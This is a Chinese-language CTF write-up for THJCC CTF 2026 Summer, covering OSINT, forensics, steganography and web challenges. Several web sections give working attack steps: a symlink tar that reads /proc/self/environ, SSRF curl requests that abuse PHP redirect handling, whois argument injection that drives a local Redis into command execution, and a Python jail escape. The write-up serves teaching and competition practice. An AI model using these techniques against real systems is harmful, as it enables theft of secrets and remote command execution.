---
title: "THJCC CTF 2026 Summer Writeup"
published: 2026-08-18
description: |-
  THJCC CTF 2026 Summer 
image: "/img/logo2.png"
tags: ["writeup", "note", "CTF"]
category: "CTF"
draft: false
---

## Welcome

![Welcome 動畫](/img/thjcc-ctf-2026-summer/welcome.gif)

裡面的文字按順序排好：

```text
https://welcome.xzhiyouu.idv.tw;Passcode:NT9C-S8DP-D85B-Z8H6
```
點開鏈結輸入密碼打開likn`https://pastebin.com/DUxM02Gp`即可取得flag
>THJCC{w3lc0me_t0_tHjCc_CTF_sUmM3r_ed1ti0n}
## A Little Penguin's Starry Sky Observation

### 題目重點

題目給一張裁切星空照片，要求判斷核心星座、官方三字縮寫，以及星座大略中心的 RA/Dec 整數值。

### 解法

解壓 `Starry_Sky_Observation.jpeg.zip` 後，照片中央可以看到三顆幾乎等距成一直線的亮星，也就是獵戶座腰帶。下方還有獵戶座之劍與明亮星雲 M42，左上方則有偏橘色的參宿四，整體特徵高度吻合 Orion。

確認星座後查官方縮寫，Orion 的 IAU 三字縮寫是 `Ori`。題目要求小寫，所以使用 `ori`。

座標部分，題目要的是「星座的大略中心」且取整數小時與度數。常見星座位置表把 Orion 給為 RA 5h、Dec +5°。本機也用參宿四、參宿五、腰帶三星、參宿七、參宿六等亮星做粗略座標擬合，照片中心約在 RA 5h36m、Dec +1.3°，確認裁切範圍確實位於 Orion 內。
>THJCC{ori=RA5h,Dec+5°}


---

## Afterimage2

### 題目重點

題目提供 USB capture，情境是資安團隊發現一條不明纜線連接到疑似外洩工作站，需要分析原始流量。

### 解法

解壓後的 `usb_capture.pcap` 是 PCAP 2.4，link-layer type 為 DLT 220，也就是 Linux usbmon mmapped 格式。封包共有 50 筆，全部是 bus 1、device 10、endpoint `0x81` 的 interrupt IN transfer completion，payload 長度都是 8 bytes。

USB HID boot keyboard report 格式為：

```text
[modifier][reserved][key1][key2][key3][key4][key5][key6]
```

封包呈現規律的「非零按鍵 report」與「全零 release report」交替：

- 奇數 frames 1, 3, 5, ..., 49 是按鍵。
- 偶數 frames 是 `00 00 00 00 00 00 00 00` 放開按鍵。
- 共 25 個實際字元。
- modifier `0x02` 代表 Left Shift，用於大寫與 `{ _ }` 等符號。

用 US keyboard layout 解 HID usage code，可以得Flag

>THJCC{hid_k3y5tr0k3_l34k}


---

## Time Machine

### 題目重點

題目是一個備份快照服務，提供：

| Endpoint | 功能 |
|---|---|
| `POST /restore` | 上傳 `.zip`、`.tar`、`.tar.gz` 並解壓 |
| `GET /snapshot` | 將工作目錄打包成 `snapshot.zip` |
| `POST /reset` | 清空工作目錄 |

### 解法

伺服器驗證 archive 時只檢查 member 的名字，防止絕對路徑與 `..`：

```python
def escapes(name):
    return name.startswith("/") or ".." in name.split("/")
```

問題是它沒有檢查 symlink 的 `linkname`。如果上傳一個名字合法、但指向敏感檔案的 symlink，驗證會通過。

接著 `/snapshot` 使用 `shutil.make_archive` / `zipfile.write` 打包；遇到 symlink 時會跟著 symlink 讀目標內容，而不是只保存 symlink 本身。兩層邏輯不一致，形成任意檔案讀取。

利用方式：

```bash
mkdir -p evil
ln -s /proc/self/environ evil/e
tar -cf evil.tar -C evil e
```

`e` 這個 member name 沒有 `/` 開頭，也沒有 `..`，可通過驗證，但它的 link target 是 `/proc/self/environ`。上傳後再下載 snapshot：

```bash
curl -c cj.txt -b cj.txt -F "archive=@evil.tar" http://chal.thjcc.org:9005/restore
curl -c cj.txt -b cj.txt http://chal.thjcc.org:9005/snapshot -o snapshot.zip
unzip -p snapshot.zip e | grep FLAG
```

`snapshot.zip` 裡的 `e` 就會是伺服器環境變數，其中包含 `FLAG=...`。

### Flag


>THJCC{th3_v3r1f13r_ch3ck3d_th3_n4m3_but_n0t_th3_l1nkn4m3}


---

## 67jail

### 題目重點

題目是一個 Python jail。輸入必須剛好 6767 字元，並且有一串限制：

- 禁用 `' " _ ` \ #`
- 禁用 ASCII 字母與數字
- `;` 最多 1 個
- 若字元是 identifier 且 NFKC 後不變，則拒絕
- `__builtins__` 只剩 `print`、`open`、`chr`

### 解法

核心繞過是 Python identifier 的 NFKC 正規化。全形英文字母如 `ｐｒｉｎｔ` 通過題目的字元檢查，因為 NFKC 後會變成 ASCII，但原字元本身不等於正規化結果；進入 `exec` 時，Python 又會把 identifier 正規化為 `print`。

不能寫 ASCII 數字，也不能用全形數字，因此用布林比較構造數字：

```python
[]==[]   # True，也就是 1
```

要表示整數 `n`，就把 `([]==[])` 連加 `n` 次。接著用 `chr()` 組字串，不需要引號：

```python
chr(47)+chr(102)+chr(108)+chr(97)+chr(103)
```

這會組出 `/flag`。最後用全形 identifier 呼叫：

```python
print(open("/flag").read())
```

實際 payload 中所有英文字母轉成全形，數字用 `([]==[])` 連加產生，再用空白補到 6767 字元。
>THJCC{676767676767676767676767676767676767676767676767}


## Where is our head of challenges?
![Where is our head of challenges 題目圖片](/img/thjcc-ctf-2026-summer/where-is-our-head.jpg)

### 題目重點
ZURICH與旁邊的M字

<!-- 地圖細節圖待取得原檔後補入 public/img/thjcc-ctf-2026-summer/。 -->
### 解法
google osint推斷為摩爾本市中心
M字有在 左邊大樓形狀一樣 不排除改商號的可能
>THJCC{144.95,-37.81}


---

## get-file1

### 題目重點

`get-file` 系列是 PHP SSRF 題。Docker Compose 裡有三個服務：

| 服務 | 說明 |
|---|---|
| Web / PHP | 對外 SSRF 入口 |
| redirector | 內網 redirect 服務 |
| flag service | 只接受 Host 為 `flag.thjcc` 且 path 為 `/flag.txt` |

PHP 入口 `file.php` 只允許 http/https，並擋掉直接連 `flag.thjcc`。

### 解法

第一題的漏洞在 redirect 檢查大小寫不一致。`file.php` 手動檢查 redirect header 時只認大寫開頭：

```php
str_starts_with($v, 'Location:')
```

但 redirector 的 `/a` 回的是小寫 `location:`：

```python
self.send_header('location', 'http://flag.thjcc/flag.txt')
```

因此手動檢查抓不到 redirect 目標，直接進入 `file_get_contents`。PHP http wrapper 實際抓取時會自動跟隨 lowercase `location:`，最後請求到：

```text
http://flag.thjcc/flag.txt
```

因為這次 Host 正好是 `flag.thjcc`，內部 flag service 會回傳 flag。

Exploit：

```bash
curl 'http://chal.thjcc.org:8081/file.php?u=http://r/a'
```

>>THJCC{pHp_StReAm_30X_cAsE_43082ed528}


---

## get-file2

### 題目重點

第二題修掉大小寫問題：手動檢查改用 case-insensitive `Location:` regex。但它只取第一條 Location header。

### 解法

`get_headers()` 檢查 redirect 時遇到第一條 Location 就 `break`：

```php
if (preg_match('/^Location:/i', $v)) {
    $n = trim(substr($v, strpos($v, ':') + 1));
    break;
}
```

redirector 的 `/a` 一次回兩個 Location：

```python
self.send_header('Location', 'http://r/x')
self.send_header('Location', 'http://flag.thjcc/flag.txt')
```

手動驗證層只看到第一條 `http://r/x`，host 合法，所以通過；但真正 `file_get_contents` 自動 follow redirect 時，PHP http wrapper 會跟隨最後一條，跳到 `http://flag.thjcc/flag.txt`。

這就是「驗證層取第一條、執行層跟最後一條」的差異。

Exploit：

```bash
curl 'http://chal.thjcc.org:8082/file.php?u=http://r/a'
```

### Flag

>THJCC{PHP_stream_30x_DuAl_65de4980cf}


---

## Who is Whois? 2

### 題目重點

題目是一個 WHOIS Lookup 服務，後端把 POST JSON 裡的 `query` split 後丟給系統 `whois` 指令。沒有 shell injection，但可以注入 whois 參數。

### 解法

先測：

```text
{"query": "--version"}
```

可看到 whois 版本，代表參數會直接進 argv。再測：

```text
{"query": "-p 9999 example.com"}
```

會卡到 timeout，表示 `-h` / `-p` 這類 whois 連線參數可控。於是可以把 whois 當 SSRF client 掃 localhost：

```text
{"query": "-h 127.0.0.1 -p 6379 test"}
```

6379 回 `-ERR unknown command 'test'`，確認本機有無驗證 Redis。

接著用 whois 連 Redis 下指令：

```text
INFO server
MODULE LIST
COMMAND LIST
```

可以發現 Redis 載入了自訂模組，真正命令名包含 `x.exec`。`x.exec` 需要 hex 編碼命令：

```text
x.exec 6964                 # id
x.exec 6c73202f             # ls /
x.exec 6c73202d6c61202f666c6167
```

`/flag` 權限是可執行但不可讀，所以 `cat /flag` 不行，要直接執行 `/flag`：

```text
x.exec 2f666c6167
```

payload：

```bash
curl -s -X POST http://chal.thjcc.org:5000/whois \
  -H 'Content-Type: application/json' \
  -d '{"query":"-h 127.0.0.1 -p 6379 x.exec 2f666c6167"}'
```

>THJCC{Wh0_15_wH015???WH0_15_wh0_15:D}


---

## TeaGod666

### 題目重點

題目是一個整人風格的智慧路由器管理介面，目標為：

```text
http://chal.thjcc.org:7297/
```

### 解法

先看前端 JavaScript，可以列出管理 API：

```text
/api/login
/api/session
/api/update/check
/api/update/package
/api/system/logs
/api/wifi
/api/reboot
```

`/api/update/check` 會回傳 firmware package URL：

```text
/api/update/package?channel=stable
```

下載 `.bin` 後，前 172 bytes 是加密 blob。用 XOR key：

```text
teashop-666
```

解開後得到 factory service account：

```json
{"username": "admin", "password": "oolong_tea_666", "note": "Factory service account"}
```

使用帳密 `admin` / `oolong_tea_666` 登入：

```text
POST /api/login
```

取得 session 後查 debug 日誌：

```text
GET /api/system/logs?level=debug
```

`factory_validation` 事件中的 maintenance note 夾帶 flag。

### Flag

>THJCC{t3ag0d666_h77p5://y0u7u.b3/Dji_wUhFPvo?si=z1B9a-4nShzop-du&t=1577}


---

## Starry Sky

### 題目重點

題目給一張看似普通的星空 PNG `challenge.png`，提示文字提到：

```text
Even the truth wears a mask here -- a single byte lifts it.
The rest is just knowing which grains to read, and how far apart.
```

關鍵字是 single byte mask、which grains、how far apart。

### 解法

先檢查 PNG 結構：

- 圖片為 RGB PNG，尺寸 512 x 512。
- PNG chunk CRC 正常。
- IEND 後沒有附加資料。
- 沒有直接 `THJCC{...}` 明文。

提示中的 single byte mask 很像 XOR；which grains 代表要選對通道或 bit plane；how far apart 代表固定 stride 取樣。

枚舉 RGB channel、bit plane、stride、bit order，利用 flag 固定前綴 `THJCC{` 驗證。最後找到：

```text
channel: B
bit: 0
stride: 5
bit order: MSB-first
XOR key: 0x5a
```

解碼流程：

1. 圖片依 row-major 順序攤平成像素序列。
2. 取每個像素藍色通道最低位元。
3. 從第一位開始，每隔 5 個 bit 取一位。
4. 每 8 位用 MSB-first 組 byte。
5. 每個 byte XOR `0x5A`。

前綴驗證：

```text
encoded: 0e 12 10 19 19 21
xor 5a: 54 48 4a 43 43 7b
ascii : T  H  J  C  C  {
```

繼續解碼即可得到完整 flag。

### Flag

>THJCC{c0unt1ng_blu3s_by_thr33s}


---

## Man!
![Man! 題目圖片](/img/thjcc-ctf-2026-summer/man-challenge.png)

### 題目重點

題目敘述提到直升機黑盒子損壞，只剩最後傳出的迷因梗圖。附件是 `final_koby_challenge.png.zip`。

### 解法

解壓外層 ZIP 後得到 PNG。檔案結構檢查發現：

- PNG 本體尺寸為 365 x 547，RGB。
- metadata 有 `MambaOut`、`Helicopter_Blackbox` 等線索。
- IEND 結束後還有附加資料。
- 在 offset `0x2C3A2` 可以切出一個 ZIP。

切出尾端 ZIP：

```bash
dd if=final_koby_challenge.png of=2C3A2.zip bs=1 skip=$((0x2C3A2))
```

這個 ZIP 內含加密的 `flag.txt`。另一個 `147.zlib` 路線是煙霧彈：它不是乾淨的單一 zlib stream，而是從 IDAT 位置一路切到檔尾，中間混入 chunk 邊界與 ZIP。

接著檢查影像隱寫。對紅色通道做 LSB extraction，依 row-major 順序取 `R & 1`，每 8 bit 用 MSB-first 組成 byte，可以讀到：

```text
SeeYouAgain1978
```

用這組密碼解尾端 ZIP：

```bash
unzip -P SeeYouAgain1978 2C3A2.zip
```

解出的 `flag.txt` 長度為 35 bytes，CRC32 `21f25418` 與 ZIP central directory 紀錄一致。

### Flag

>THJCC{Man_BA_0ut_Seeyouaga1n_1978}


---

## NoNo

### 題目重點

題目提供 HTTP logs 與 PCAP，背景是 SOC 從 `chal.thjcc.org` 抓下告警後的 HTTP 紀錄，要找出 secret message。

### 解法

附件包含：

- `nginx-access.ndjson`
- `portal-app.ndjson`
- `modsec-waf.ndjson`
- `capture.pcap`

日誌裡有大量噪音和誘餌端點，例如 `/flag`、`/api/v1/flag`、`/s3cr3t/report`、`/.git/config`。其中 `/.git/config` 的提示提到「Decode the blob below」，真正意思是去看二進位封包，也就是 `capture.pcap`。

用 Wireshark Follow TCP Stream 檢查可疑 stream，可看到內部 Host：

```http
GET /s3cr3t/rep0rt
Host: internal.portal
```

response body 是：

```html
<html><body>// internal use only</body></html>
```

這不是最終 flag，而是提示要用 live server 造訪內部報告路徑。最後實際訪問：

```text
http://chal.thjcc.org:50000/s3cr3t/rep0rt/
```

注意尾端 `/`，頁面會回傳 Internal Report，其中 `report token` 是真正 flag。

>THJCC{f0ll0w_th3_str34m_2_th3_h1dd3n_r3p0rt}

---

## All night long...

### 題目重點

本機對話紀錄中有一題提供 `signal.wav`。檔案看起來像一般音訊，但左右聲道關係很不自然，中央有規律的週期訊號。目前無法從本機紀錄確認它對應原清單上的哪個題名，因此先保留為題名未對上。

### 解法

先檢查 RIFF/WAVE 結構，檔案是標準 16-bit PCM stereo、44.1 kHz，沒有額外 chunk、附加資料或直接明文 `THJCC{...}`。

觀察波形與 spectrogram 後，4.6 秒到 9.0 秒附近有非常規律的週期性訊號。自相關可量到週期為 2,971 samples，約 0.06737 秒。把一個週期的左右聲道當作 XY 座標畫出來，會得到 oscilloscope-style vector drawing，但一開始直接用 L/R 同時間點配對並不清楚。

關鍵是左右聲道有時間偏移。用 derivative magnitude 做 cyclic lag correlation，最大峰值出現在右聲道 roll `-1129` samples，相關係數約 `0.8115`。將右聲道照這個 offset 對齊後，再用：

```text
X = left channel
Y = shifted right channel
```

畫出單一週期軌跡，文字會清楚出現。圖像讀到的是：

```text
THJCC{δράκος}
```

其中 `δράκος` 是 Greek，逐字碼點為：

```text
δ U+03B4
ρ U+03C1
ά U+03AC
κ U+03BA
ο U+03BF
ς U+03C2
```

本機紀錄也確認該字串已是 NFC normalized，UTF-8 bytes 為：

```text
54 48 4a 43 43 7b ce b4 cf 81 ce ac ce ba ce bf cf 82 7d
```

### Flag

```text
THJCC{δράκος}
```
